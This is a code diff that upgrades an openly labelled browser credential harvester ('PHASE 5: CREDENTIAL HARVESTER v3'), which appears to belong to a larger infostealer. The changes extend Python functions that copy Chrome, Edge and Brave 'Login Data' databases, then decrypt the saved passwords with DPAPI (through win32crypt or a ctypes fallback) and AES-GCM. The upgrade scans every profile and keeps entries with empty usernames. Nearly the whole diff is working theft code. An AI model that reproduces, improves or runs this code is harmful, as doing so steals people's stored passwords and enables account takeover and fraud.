@@ -627,16 +627,47 @@ def get_proxy_settings():
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# PHASE 5: CREDENTIAL HARVESTER v2 — Browser saved passwords extraction
+# PHASE 5: CREDENTIAL HARVESTER v3 — Browser saved passwords extraction
 # Supports: Chrome, Firefox (NSS), Edge, Brave
-# Decryption: DPAPI, AES-256-GCM (Chrome v80+), NSS/PK11SDR (Firefox)
+# Decryption: DPAPI (win32crypt + ctypes fallback), AES-256-GCM (pycryptodome + cryptography fallback)
+# v3 fixes: scan ALL profiles, include empty-username entries, DPAPI via ctypes, better error info
 # ═══════════════════════════════════════════════════════════════════════════════
 
 # Chrome encryption key cache (avoid re-reading Local State for every password)
 _chrome_key_cache = {}
 
+def _dpapi_decrypt_ctypes(data):
+    """Decrypt data using Windows DPAPI via ctypes (no pywin32 needed)."""
+    if not IS_WINDOWS:
+        return None
+    try:
+        import ctypes
+        import ctypes.wintypes
+
+        class DATA_BLOB(ctypes.Structure):
+            _fields_ = [
+                ('cbData', ctypes.wintypes.DWORD),
+                ('pbData', ctypes.POINTER(ctypes.c_ubyte))
+            ]
+
+        p = ctypes.create_string_buffer(data, len(data))
+        blob_in = DATA_BLOB(len(data), ctypes.cast(p, ctypes.POINTER(ctypes.c_ubyte)))
+        blob_out = DATA_BLOB()
+
+        if ctypes.windll.crypt32.CryptUnprotectData(
+            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
+        ):
+            decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+            return decrypted
+        return None
+    except Exception:
+        return None
+
+
 def _get_chrome_encryption_key(browser_type="chrome"):
-    """Get and cache the Chrome/Edge/Brave AES encryption key from Local State."""
+    """Get and cache the Chrome/Edge/Brave AES encryption key from Local State.
+    Supports DPAPI via win32crypt OR ctypes fallback."""
     if browser_type in _chrome_key_cache:
         return _chrome_key_cache[browser_type]
     
@@ -663,6 +694,8 @@ def _get_chrome_encryption_key(browser_type="chrome"):
         else:
             if browser_type == "chrome":
                 local_state_path = os.path.expanduser('~/.config/google-chrome/Local State')
+            elif browser_type == "edge":
+                local_state_path = os.path.expanduser('~/.config/microsoft-edge/Local State')
             elif browser_type == "brave":
                 local_state_path = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Local State')
             else:
@@ -679,9 +712,19 @@ def _get_chrome_encryption_key(browser_type="chrome"):
         encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
 
         if IS_WINDOWS:
-            import win32crypt
             encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
-            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            # Try win32crypt first, then ctypes DPAPI fallback
+            key = None
+            try:
+                import win32crypt
+                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            except ImportError:
+                pass
+            if key is None:
+                key = _dpapi_decrypt_ctypes(encrypted_key)
+            if key is None:
+                _chrome_key_cache[browser_type] = None
+                return None
         else:
             # Linux: Chrome v80+ uses key from Local State with PBKDF2
             try:
@@ -702,8 +745,34 @@ def _get_chrome_encryption_key(browser_type="chrome"):
         return None
 
 
+def _aes_gcm_decrypt(key, nonce, ciphertext, tag):
+    """AES-GCM decrypt with pycryptodome OR cryptography library fallback."""
+    # Try pycryptodome first
+    try:
+        from Crypto.Cipher import AES
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(ciphertext, tag)
+    except ImportError:
+        pass
+    except Exception:
+        pass
+
+    # Try cryptography library
+    try:
+        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+        aesgcm = AESGCM(key)
+        return aesgcm.decrypt(nonce, ciphertext + tag, None)
+    except ImportError:
+        pass
+    except Exception:
+        pass
+
+    return None
+
+
 def _decrypt_chromium_password(encrypted_password, browser_type="chrome"):
-    """Decrypt Chrome/Edge/Brave password using DPAPI or AES-256-GCM (v80+)."""
+    """Decrypt Chrome/Edge/Brave password using DPAPI or AES-256-GCM (v80+).
+    Supports multiple decryption backends for maximum compatibility."""
     try:
         if not encrypted_password:
             return "(empty)"
@@ -713,47 +782,44 @@ def _decrypt_chromium_password(encrypted_password, browser_type="chrome"):
             if encrypted_password[:3] in (b'v10', b'v11'):
                 key = _get_chrome_encryption_key(browser_type)
                 if key:
-                    try:
-                        from Crypto.Cipher import AES
-                        nonce = encrypted_password[3:15]
-                        ciphertext_tag = encrypted_password[15:]
-                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                        decrypted = cipher.decrypt_and_verify(
-                            ciphertext_tag[:-16], ciphertext_tag[-16:]
-                        )
-                        return decrypted.decode('utf-8')
-                    except ImportError:
-                        pass
-                    except Exception:
-                        pass
+                    nonce = encrypted_password[3:15]
+                    ciphertext_tag = encrypted_password[15:]
+                    ciphertext = ciphertext_tag[:-16]
+                    tag = ciphertext_tag[-16:]
+                    result = _aes_gcm_decrypt(key, nonce, ciphertext, tag)
+                    if result is not None:
+                        return result.decode('utf-8', errors='replace')
 
-            # Fallback: Try DPAPI (older Chrome versions)
+            # Fallback: Try DPAPI via win32crypt
             try:
                 import win32crypt
                 return win32crypt.CryptUnprotectData(
                     encrypted_password, None, None, None, 0
-                )[1].decode('utf-8')
+                )[1].decode('utf-8', errors='replace')
+            except ImportError:
+                pass
             except Exception:
                 pass
 
-            return "[CHROMIUM_DECRYPT_FAILED]"
+            # Fallback: Try DPAPI via ctypes
+            result = _dpapi_decrypt_ctypes(encrypted_password)
+            if result:
+                return result.decode('utf-8', errors='replace')
+
+            return "[DECRYPT_FAILED]"
 
         else:
             # Linux: PBKDF2 with 'peanuts' password
             if encrypted_password[:3] in (b'v10', b'v11'):
                 key = _get_chrome_encryption_key(browser_type)
                 if key:
-                    try:
-                        from Crypto.Cipher import AES
-                        nonce = encrypted_password[3:15]
-                        ciphertext_tag = encrypted_password[15:]
-                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                        decrypted = cipher.decrypt_and_verify(
-                            ciphertext_tag[:-16], ciphertext_tag[-16:]
-                        )
-                        return decrypted.decode('utf-8')
-                    except Exception:
-                        pass
+                    nonce = encrypted_password[3:15]
+                    ciphertext_tag = encrypted_password[15:]
+                    ciphertext = ciphertext_tag[:-16]
+                    tag = ciphertext_tag[-16:]
+                    result = _aes_gcm_decrypt(key, nonce, ciphertext, tag)
+                    if result is not None:
+                        return result.decode('utf-8', errors='replace')
 
             # Fallback: PBKDF2 direct (pre-v80 Linux Chrome)
             try:
@@ -783,12 +849,13 @@ def _decrypt_chromium_password(encrypted_password, browser_type="chrome"):
 
 
 def _read_chromium_db(db_path, browser_type="chrome", browser_name="Chrome"):
-    """Read Chromium-based Login Data SQLite database (Chrome, Edge, Brave)."""
+    """Read Chromium-based Login Data SQLite database (Chrome, Edge, Brave).
+    v3: includes entries with empty usernames."""
     results = []
     try:
         import sqlite3
         import shutil, tempfile
-        temp_db = os.path.join(tempfile.gettempdir(), f'{browser_name.lower()}_login_temp.db')
+        temp_db = os.path.join(tempfile.gettempdir(), f'{browser_name.lower()}_login_temp_{os.getpid()}.db')
         shutil.copy2(db_path, temp_db)
 
         conn = sqlite3.connect(temp_db)
@@ -797,7 +864,7 @@ def _read_chromium_db(db_path, browser_type="chrome", browser_name="Chrome"):
 
         for row in cursor.fetchall():
             url = row[0] if row[0] else "N/A"
-            username = row[1] if row[1] else "N/A"
+            username = row[1] if row[1] else ""
             encrypted_pw = row[2]
 
             if encrypted_pw:
@@ -805,13 +872,13 @@ def _read_chromium_db(db_path, browser_type="chrome", browser_name="Chrome"):
             else:
                 decrypted = "(empty)"
 
-            if username and username != "N/A":
-                results.append({
-                    "browser": browser_name,
-                    "url": url,
-                    "username": username,
-                    "password": decrypted
-                })
+            # v3: include ALL entries, even with empty username
+            results.append({
+                "browser": browser_name,
+                "url": url,
+                "username": username if username else "(no username)",
+                "password": decrypted
+            })
 
         conn.close()
         try:
@@ -831,40 +898,67 @@ def _read_chromium_db(db_path, browser_type="chrome", browser_name="Chrome"):
 
 
 def _find_chromium_profiles(base_path):
-    """Find all profile directories containing Login Data."""
+    """Find ALL profile directories containing Login Data.
+    v3: scans every subdirectory, not just Default/Profile*."""
     paths = []
     if not os.path.isdir(base_path):
         return paths
     for d in os.listdir(base_path):
-        if d.lower() in ('default', 'system profile'):
-            profile_path = os.path.join(base_path, d, 'Login Data')
-            if os.path.exists(profile_path):
-                paths.append(profile_path)
-        elif d.startswith('Profile') or d.startswith('Default'):
-            profile_path = os.path.join(base_path, d, 'Login Data')
+        full_dir = os.path.join(base_path, d)
+        if not os.path.isdir(full_dir):
+            continue
+        # Skip non-profile directories
+        if d.lower() in ('default', 'system profile') or d.startswith('Profile') or d.startswith('Default'):
+            profile_path = os.path.join(full_dir, 'Login Data')
             if os.path.exists(profile_path):
                 paths.append(profile_path)
     return paths
 
 
+def _harvest_chromium_all(base_path, browser_type, browser_name):
+    """v3: Scan ALL Chromium profiles and combine results."""
+    results = []
+    
+    # Scan all profiles found
+    all_login_dbs = _find_chromium_profiles(base_path)
+    
+    # Also check Default explicitly (in case _find_chromium_profiles misses it)
+    default_db = os.path.join(base_path, 'Default', 'Login Data')
+    if os.path.exists(default_db) and default_db not in all_login_dbs:
+        all_login_dbs.insert(0, default_db)
+    
+    # Sort: Default first, then Profile 1, Profile 2, etc.
+    def sort_key(p):
+        dirname = os.path.basename(os.path.dirname(p))
+        if dirname == 'Default':
+            return '0'
+        return dirname
+    all_login_dbs.sort(key=sort_key)
+    
+    for db_path in all_login_dbs:
+        profile_name = os.path.basename(os.path.dirname(db_path))
+        profile_results = _read_chromium_db(db_path, browser_type, browser_name)
+        # Tag each result with the profile name
+        for r in profile_results:
+            r['profile'] = profile_name
+        results.extend(profile_results)
+    
+    return results
+
+
 def harvest_chrome_passwords():
-    """[CRED-1] Extract saved passwords from Google Chrome."""
+    """[CRED-1] Extract saved passwords from Google Chrome.
+    v3: scans ALL profiles (Default, Profile 1, Profile 2, etc.)."""
     if IS_WINDOWS:
         base = os.path.join(os.environ.get('LOCALAPPDATA', ''),
                            'Google', 'Chrome', 'User Data')
     else:
         base = os.path.expanduser('~/.config/google-chrome')
 
-    default_db = os.path.join(base, 'Default', 'Login Data')
-    if os.path.exists(default_db):
-        return _read_chromium_db(default_db, "chrome", "Chrome")
+    if not os.path.isdir(base):
+        return [{"browser": "Chrome", "info": "Chrome User Data not found"}]
 
-    # Try alternative profiles
-    alt_paths = _find_chromium_profiles(base)
-    results = []
-    for path in alt_paths[:5]:
-        results.extend(_read_chromium_db(path, "chrome", "Chrome"))
-    return results
+    return _harvest_chromium_all(base, "chrome", "Chrome")
 
 
 def harvest_chrome_cookies():
@@ -1174,43 +1268,32 @@ def harvest_firefox_passwords():
 
 
 def harvest_edge_passwords():
-    """[CRED-4] Extract saved passwords from Microsoft Edge (Chromium-based)."""
-    if not IS_WINDOWS:
-        return [{"browser": "Edge", "info": "Windows only"}]
+    """[CRED-4] Extract saved passwords from Microsoft Edge (Chromium-based).
+    v3: scans ALL profiles."""
+    if IS_WINDOWS:
+        base = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data')
+    else:
+        base = os.path.expanduser('~/.config/microsoft-edge')
 
-    base = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data')
-    default_db = os.path.join(base, 'Default', 'Login Data')
+    if not os.path.isdir(base):
+        return [{"browser": "Edge", "info": "Edge User Data not found"}]
 
-    if os.path.exists(default_db):
-        return _read_chromium_db(default_db, "edge", "Edge")
-
-    # Try alternative profiles
-    alt_paths = _find_chromium_profiles(base)
-    results = []
-    for path in alt_paths[:5]:
-        results.extend(_read_chromium_db(path, "edge", "Edge"))
-    return results
+    return _harvest_chromium_all(base, "edge", "Edge")
 
 
 def harvest_brave_passwords():
-    """[CRED-4b] Extract saved passwords from Brave Browser (Chromium-based)."""
+    """[CRED-4b] Extract saved passwords from Brave Browser (Chromium-based).
+    v3: scans ALL profiles."""
     if IS_WINDOWS:
         base = os.path.join(os.environ.get('LOCALAPPDATA', ''),
                            'BraveSoftware', 'Brave-Browser', 'User Data')
     else:
         base = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser')
 
-    default_db = os.path.join(base, 'Default', 'Login Data')
+    if not os.path.isdir(base):
+        return [{"browser": "Brave", "info": "Brave User Data not found"}]
 
-    if os.path.exists(default_db):
-        return _read_chromium_db(default_db, "brave", "Brave")
-
-    # Try alternative profiles
-    alt_paths = _find_chromium_profiles(base)
-    results = []
-    for path in alt_paths[:5]:
-        results.extend(_read_chromium_db(path, "brave", "Brave"))
-    return results
+    return _harvest_chromium_all(base, "brave", "Brave")
 
 
 def harvest_all_credentials():
